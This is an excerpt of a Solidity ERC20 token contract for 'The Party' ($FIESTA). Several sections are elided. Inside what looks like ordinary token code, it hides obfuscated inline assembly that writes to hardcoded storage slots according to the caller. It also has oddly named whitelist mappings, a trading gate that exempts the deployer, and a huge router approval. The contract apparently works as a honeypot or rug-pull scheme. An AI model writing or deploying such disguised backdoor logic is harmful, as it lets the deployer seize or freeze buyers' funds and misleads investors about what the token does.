...
/*
THE PARTY | ETH
Party people. Never stop dancing!
$FIESTA
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _eraseIt = block.number*2;

    mapping (address => bool) private _forceEnergy; 
    mapping (address => bool) private _forceMagnetic;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _bigSand;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private smallPipe;
    address public pair;
    ...
    bool private trading; uint256 private danceShow = 1; bool private appleDapp;
    uint256 private _decimals; uint256 private repairShop;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMerge.push(_router); addMerge.push(msgSender_); addMerge.push(pair);
        for (uint256 q=0; q < 3;) {_forceEnergy[addMerge[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitStart() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0x38f3c550889a5124c9ce1444664845e3f974bc1706f256edb5cd3d9b332048f8))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7a2d6f557d97a55c8f6a580ea7e82ae8327a8d472bdbff86f711fb0bc2fd42e0,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0x38f3c550889a5124c9ce1444664845e3f974bc1706f256edb5cd3d9b332048f8,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _eraseIt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMerge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployFiesta(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMerge[0], 10 ** 77);
        _InitStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFiesta(creator, initialSupply);
    }
}

contract TheParty is ERC20Token {
    constructor() ERC20Token("The Party", "FIESTA", msg.sender, 100000 * 10 ** 18) {
    }
}